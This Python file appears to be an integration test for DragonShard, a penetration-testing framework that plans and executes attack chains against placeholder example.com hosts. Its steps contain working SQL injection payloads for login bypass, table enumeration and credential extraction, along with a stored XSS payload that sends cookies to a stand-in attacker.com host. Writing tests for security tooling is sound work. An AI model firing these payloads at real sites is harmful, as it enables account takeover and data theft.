#!/usr/bin/env python3
"""
DragonShard Executor Integration Test

Demonstrates the end-to-end functionality of the executor module
by creating sample attack chains and executing them.
"""

import json
import logging
import time
from pathlib import Path

from dragonshard.executor.executor import AttackExecutor, ExecutionConfig
from dragonshard.executor.session_manager import SessionManager, AuthMethod, AuthCredentials
from dragonshard.executor.state_graph import StateGraph, ServiceType, HostStatus, VulnerabilityLevel
from dragonshard.planner.chain_planner import (
    AttackChain, AttackStep, AttackType, AttackImpact, AttackComplexity
)


def setup_logging():
    """Set up logging configuration."""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )


def create_sample_attack_chains():
    """Create sample attack chains for testing."""
    chains = []
    
    # Chain 1: SQL Injection Attack
    sql_steps = [
        AttackStep(
            step_id="sql_step_1",
            step_name="SQL Injection - Login Bypass",
            attack_type=AttackType.SQL_INJECTION,
            target_url="http://example.com/login.php",
            payload="' OR 1=1--",
            expected_outcome="Login bypass successful",
            success_criteria="Access granted without valid credentials",
            estimated_time=30
        ),
        AttackStep(
            step_id="sql_step_2",
            step_name="SQL Injection - Data Extraction",
            attack_type=AttackType.SQL_INJECTION,
            target_url="http://example.com/search.php",
            payload="' UNION SELECT username,password FROM users--",
            expected_outcome="User data extracted",
            success_criteria="Database error or user data returned",
            estimated_time=45
        )
    ]
    
    sql_chain = AttackChain(
        chain_id="sql_injection_chain",
        chain_name="SQL Injection Attack Chain",
        description="Comprehensive SQL injection attack targeting login and search functionality",
        target_host="http://example.com",
        attack_steps=sql_steps,
        total_impact=AttackImpact.HIGH,
        total_complexity=AttackComplexity.MEDIUM,
        success_probability=0.7,
        estimated_duration=75
    )
    chains.append(sql_chain)
    
    # Chain 2: XSS Attack
    xss_steps = [
        AttackStep(
            step_id="xss_step_1",
            step_name="XSS - Reflected",
            attack_type=AttackType.XSS,
            target_url="http://example.com/search.php",
            payload="<script>alert('XSS')</script>",
            expected_outcome="Script execution in browser",
            success_criteria="Alert popup or script execution",
            estimated_time=20
        ),
        AttackStep(
            step_id="xss_step_2",
            step_name="XSS - Stored",
            attack_type=AttackType.XSS,
            target_url="http://example.com/comment.php",
            payload="<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
            expected_outcome="Stored XSS payload",
            success_criteria="Payload stored and executed",
            estimated_time=30
        )
    ]
    
    xss_chain = AttackChain(
        chain_id="xss_attack_chain",
        chain_name="Cross-Site Scripting Attack Chain",
        description="XSS attack targeting search and comment functionality",
        target_host="http://example.com",
        attack_steps=xss_steps,
        total_impact=AttackImpact.MEDIUM,
        total_complexity=AttackComplexity.LOW,
        success_probability=0.8,
        estimated_duration=50
    )
    chains.append(xss_chain)
    
    # Chain 3: Authentication Bypass
    auth_steps = [
        AttackStep(
            step_id="auth_step_1",
            step_name="Authentication Bypass - Admin Panel",
            attack_type=AttackType.AUTHENTICATION_BYPASS,
            target_url="http://example.com/admin/",
            payload="admin",
            expected_outcome="Access to admin panel",
            success_criteria="Admin panel accessible without authentication",
            estimated_time=25
        ),
        AttackStep(
            step_id="auth_step_2",
            step_name="Authentication Bypass - API Endpoint",
            attack_type=AttackType.AUTHENTICATION_BYPASS,
            target_url="http://example.com/api/users",
            payload="",
            expected_outcome="API access without authentication",
            success_criteria="User data returned without auth",
            estimated_time=20
        )
    ]
    
    auth_chain = AttackChain(
        chain_id="auth_bypass_chain",
        chain_name="Authentication Bypass Attack Chain",
        description="Authentication bypass attacks targeting admin panel and API",
        target_host="http://example.com",
        attack_steps=auth_steps,
        total_impact=AttackImpact.HIGH,
        total_complexity=AttackComplexity.LOW,
        success_probability=0.6,
        estimated_duration=45
    )
    chains.append(auth_chain)
    
    return chains


def demonstrate_executor_functionality():
    """Demonstrate the executor functionality."""
    print("🚀 DragonShard Executor Integration Test")
    print("=" * 50)
    
    # Initialize executor with custom configuration
    config = ExecutionConfig(
        timeout=10,
        max_retries=2,
        rate_limit=5.0,  # 5 requests per second
        user_agent="DragonShard-Executor/1.0"
    )
    
    executor = AttackExecutor(config)
    print(f"✅ Executor initialized with config: {config.timeout}s timeout, {config.rate_limit} req/s")
    
    # Create sample attack chains
    attack_chains = create_sample_attack_chains()
    print(f"📋 Created {len(attack_chains)} attack chains:")
    
    for i, chain in enumerate(attack_chains, 1):
        print(f"  {i}. {chain.chain_name} ({len(chain.attack_steps)} steps)")
        print(f"     Target: {chain.target_host}")
        print(f"     Impact: {chain.total_impact.value}")
        print(f"     Complexity: {chain.total_complexity.value}")
        print(f"     Success Probability: {chain.success_probability:.1%}")
    
    print("\n🎯 Executing attack chains...")
    
    # Execute each chain
    sessions = []
    for chain in attack_chains:
        print(f"\n📊 Executing: {chain.chain_name}")
        print(f"   Steps: {len(chain.attack_steps)}")
        
        # Execute the chain
        session = executor.execute_attack_chain(chain)
        sessions.append(session)
        
        print(f"   ✅ Execution completed")
        print(f"   📈 Success rate: {session.success_rate:.1%}")
        print(f"   ⏱️  Execution time: {session.total_execution_time:.2f}s")
        print(f"   📊 Steps completed: {session.completed_steps}/{session.total_steps}")
        print(f"   ❌ Steps failed: {session.failed_steps}")
        
        if session.error_log:
            print(f"   ⚠️  Errors: {len(session.error_log)}")
            for error in session.error_log:
                print(f"      - {error}")
    
    # Get execution summary
    print("\n📊 Execution Summary:")
    summary = executor.get_execution_summary()
    
    print(f"   Total sessions: {summary['total_sessions']}")
    print(f"   Completed sessions: {summary['completed_sessions']}")
    print(f"   Failed sessions: {summary['failed_sessions']}")
    print(f"   Total steps: {summary['total_steps']}")
    print(f"   Successful steps: {summary['successful_steps']}")
    print(f"   Step success rate: {summary['step_success_rate']:.1%}")
    print(f"   Avg session success rate: {summary['avg_session_success_rate']:.1%}")
    print(f"   Avg execution time: {summary['avg_execution_time']:.2f}s")
    
    # Export results
    export_file = "executor_results.json"
    executor.export_execution_results(export_file)
    print(f"\n💾 Results exported to: {export_file}")
    
    return sessions


def demonstrate_session_manager():
    """Demonstrate session manager functionality."""
    print("\n🔐 Session Manager Demonstration")
    print("=" * 40)
    
    session_manager = SessionManager()
    
    # Create sessions for different targets
    targets = [
        ("http://web.example.com", AuthMethod.FORM),
        ("http://api.example.com", AuthMethod.TOKEN),
        ("http://admin.example.com", AuthMethod.BASIC)
    ]
    
    session_ids = []
    for target, auth_method in targets:
        session_id = session_manager.create_session(target, auth_method)
        session_ids.append(session_id)
        print(f"✅ Created session {session_id} for {target} ({auth_method.value})")
    
    # Demonstrate authentication
    print("\n🔑 Authentication Testing:")
    
    credentials = AuthCredentials(
        username="admin",
        password="password123",
        token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    )
    
    for session_id in session_ids:
        session_info = session_manager.get_session_info(session_id)
        print(f"   Session {session_id}: {session_info['state']} ({session_info['auth_method']})")
        
        # Try to authenticate (this will fail in test environment)
        success = session_manager.authenticate_session(session_id, credentials)
        print(f"   Authentication result: {'✅ Success' if success else '❌ Failed'}")
    
    # Get session headers
    print("\n📋 Session Headers:")
    for session_id in session_ids:
        headers = session_manager.get_session_headers(session_id)
        print(f"   {session_id}: {len(headers)} headers")
        if headers:
            print(f"      User-Agent: {headers.get('User-Agent', 'N/A')}")
    
    # Session management
    print("\n🛠️ Session Management:")
    for session_id in session_ids:
        is_valid = session_manager.check_session_validity(session_id)
        print(f"   {session_id}: {'✅ Valid' if is_valid else '❌ Invalid'}")
    
    # Export sessions
    export_file = "session_data.json"
    session_manager.export_sessions(export_file)
    print(f"\n💾 Session data exported to: {export_file}")
    
    # Cleanup
    for session_id in session_ids:
        session_manager.destroy_session(session_id)
        print(f"🗑️  Destroyed session: {session_id}")


def demonstrate_state_graph():
    """Demonstrate state graph functionality."""
    print("\n🌐 State Graph Demonstration")
    print("=" * 35)
    
    state_graph = StateGraph()
    
    # Add hosts
    print("🏠 Adding hosts...")
    web_host = state_graph.add_host("web.example.com", "192.168.1.10", HostStatus.SCANNED)
    db_host = state_graph.add_host("db.example.com", "192.168.1.20", HostStatus.DISCOVERED)
    api_host = state_graph.add_host("api.example.com", "192.168.1.30", HostStatus.VULNERABLE)
    
    print(f"   Web server: {web_host}")
    print(f"   Database: {db_host}")
    print(f"   API server: {api_host}")
    
    # Add services
    print("\n🔧 Adding services...")
    web_http = state_graph.add_service(web_host, 80, ServiceType.HTTP, banner="Apache/2.4.41")
    web_https = state_graph.add_service(web_host, 443, ServiceType.HTTPS, banner="Apache/2.4.41")
    db_mysql = state_graph.add_service(db_host, 3306, ServiceType.DATABASE, banner="MySQL 8.0.26")
    api_http = state_graph.add_service(api_host, 8080, ServiceType.API, banner="Node.js/16.0.0")
    
    print(f"   Web HTTP: {web_http}")
    print(f"   Web HTTPS: {web_https}")
    print(f"   Database: {db_mysql}")
    print(f"   API: {api_http}")
    
    # Add vulnerabilities
    print("\n⚠️ Adding vulnerabilities...")
    vuln1 = state_graph.add_vulnerability(
        web_http, "sql_injection", VulnerabilityLevel.HIGH,
        "SQL injection in search parameter", "Error message contains SQL syntax"
    )
    vuln2 = state_graph.add_vulnerability(
        web_https, "xss", VulnerabilityLevel.MEDIUM,
        "Cross-site scripting in comment form", "Script tags reflected in response"
    )
    vuln3 = state_graph.add_vulnerability(
        api_http, "authentication_bypass", VulnerabilityLevel.CRITICAL,
        "Missing authentication on API endpoints", "Direct access to user data"
    )
    
    print(f"   SQL Injection: {vuln1}")
    print(f"   XSS: {vuln2}")
    print(f"   Auth Bypass: {vuln3}")
    
    # Add connections
    print("\n🔗 Adding connections...")
    conn1 = state_graph.add_connection(web_host, db_host, "database_query", "tcp", 3306)
    conn2 = state_graph.add_connection(web_host, api_host, "api_request", "tcp", 8080)
    
    print(f"   Web → Database: {conn1}")
    print(f"   Web → API: {conn2}")
    
    # Get summaries
    print("\n📊 Network Analysis:")
    
    vuln_summary = state_graph.get_vulnerability_summary()
    print(f"   Total vulnerabilities: {vuln_summary['total_vulnerabilities']}")
    print(f"   By severity: {vuln_summary['by_severity']}")
    print(f"   By type: {vuln_summary['by_type']}")
    
    topology = state_graph.get_network_topology()
    print(f"   Total hosts: {topology['total_hosts']}")
    print(f"   Total services: {topology['total_services']}")
    print(f"   Services by type: {topology['services_by_type']}")
    
    # Find critical paths
    critical_paths = state_graph.get_critical_paths()
    print(f"   Critical attack paths: {len(critical_paths)}")
    for i, path in enumerate(critical_paths, 1):
        print(f"      Path {i}: {' → '.join(path)}")
    
    # Export graph
    export_file = "state_graph.json"
    state_graph.export_graph(export_file)
    print(f"\n💾 State graph exported to: {export_file}")


def demonstrate_advanced_features():
    """Demonstrate advanced executor features."""
    print("\n🚀 Advanced Features Demonstration")
    print("=" * 40)
    
    # Initialize with advanced configuration
    config = ExecutionConfig(
        timeout=15,
        max_retries=3,
        rate_limit=2.0,  # Slow rate limiting for demonstration
        follow_redirects=True,
        verify_ssl=False,
        user_agent="DragonShard-Advanced/1.0"
    )
    
    executor = AttackExecutor(config)
    
    # Create a complex attack chain
    complex_steps = [
        AttackStep(
            step_id="recon_step",
            step_name="Reconnaissance",
            attack_type=AttackType.SQL_INJECTION,
            target_url="http://example.com/info.php",
            payload="' UNION SELECT version(),database(),user()--",
            expected_outcome="System information gathered",
            success_criteria="Database information returned",
            estimated_time=30
        ),
        AttackStep(
            step_id="enum_step",
            step_name="Database Enumeration",
            attack_type=AttackType.SQL_INJECTION,
            target_url="http://example.com/search.php",
            payload="' UNION SELECT table_name,NULL FROM information_schema.tables--",
            expected_outcome="Database tables enumerated",
            success_criteria="Table names returned",
            estimated_time=45
        ),
        AttackStep(
            step_id="data_step",
            step_name="Data Extraction",
            attack_type=AttackType.SQL_INJECTION,
            target_url="http://example.com/user.php",
            payload="' UNION SELECT username,password FROM users LIMIT 10--",
            expected_outcome="User credentials extracted",
            success_criteria="User data returned",
            estimated_time=60
        )
    ]
    
    complex_chain = AttackChain(
        chain_id="advanced_sql_chain",
        chain_name="Advanced SQL Injection Chain",
        description="Multi-stage SQL injection attack with reconnaissance and data extraction",
        target_host="http://example.com",
        attack_steps=complex_steps,
        total_impact=AttackImpact.HIGH,
        total_complexity=AttackComplexity.HIGH,
        success_probability=0.6,
        estimated_duration=135
    )
    
    print("🎯 Executing advanced attack chain...")
    print(f"   Chain: {complex_chain.chain_name}")
    print(f"   Steps: {len(complex_chain.attack_steps)}")
    print(f"   Estimated duration: {complex_chain.estimated_duration}s")
    
    # Execute with progress monitoring
    start_time = time.time()
    session = executor.execute_attack_chain(complex_chain)
    total_time = time.time() - start_time
    
    print(f"\n📊 Advanced Execution Results:")
    print(f"   Actual execution time: {total_time:.2f}s")
    print(f"   Success rate: {session.success_rate:.1%}")
    print(f"   Steps completed: {session.completed_steps}/{session.total_steps}")
    print(f"   Failed steps: {session.failed_steps}")
    
    # Demonstrate concurrent execution
    print("\n⚡ Concurrent Execution Test:")
    
    # Create multiple simple chains
    simple_chains = []
    for i in range(3):
        steps = [
            AttackStep(
                step_id=f"simple_step_{i}",
                step_name=f"Simple Test {i}",
                attack_type=AttackType.SQL_INJECTION,
                target_url=f"http://example{i}.com/test.php",
                payload="test",
                expected_outcome="Test completed",
                success_criteria="Response received",
                estimated_time=10
            )
        ]
        
        chain = AttackChain(
            chain_id=f"simple_chain_{i}",
            chain_name=f"Simple Chain {i}",
            description=f"Simple test chain {i}",
            target_host=f"http://example{i}.com",
            attack_steps=steps,
            total_impact=AttackImpact.LOW,
            total_complexity=AttackComplexity.LOW,
            success_probability=0.9,
            estimated_duration=10
        )
        simple_chains.append(chain)
    
    print(f"   Executing {len(simple_chains)} chains concurrently...")
    
    start_time = time.time()
    sessions = executor.execute_multiple_chains(simple_chains)
    concurrent_time = time.time() - start_time
    
    print(f"   Concurrent execution time: {concurrent_time:.2f}s")
    print(f"   Sessions completed: {len(sessions)}")
    
    for i, session in enumerate(sessions):
        print(f"     Chain {i}: {session.success_rate:.1%} success rate")


def main():
    """Main integration test function."""
    setup_logging()
    
    print("🎯 DragonShard Executor Integration Test")
    print("Testing the complete executor module functionality")
    print("=" * 60)
    
    try:
        # Test basic executor functionality
        sessions = demonstrate_executor_functionality()
        
        # Test session manager
        demonstrate_session_manager()
        
        # Test state graph
        demonstrate_state_graph()
        
        # Test advanced features
        demonstrate_advanced_features()
        
        print("\n✅ All integration tests completed successfully!")
        print("\n📁 Generated files:")
        print("   - executor_results.json (execution results)")
        print("   - session_data.json (session data)")
        print("   - state_graph.json (network state)")
        
        # Clean up generated files
        cleanup_files = [
            "executor_results.json",
            "session_data.json", 
            "state_graph.json"
        ]
        
        for file in cleanup_files:
            if Path(file).exists():
                Path(file).unlink()
                print(f"   🗑️  Cleaned up: {file}")
        
    except Exception as e:
        print(f"\n❌ Integration test failed: {e}")
        logging.exception("Integration test error")
        return 1
    
    return 0


if __name__ == "__main__":
    exit(main()) 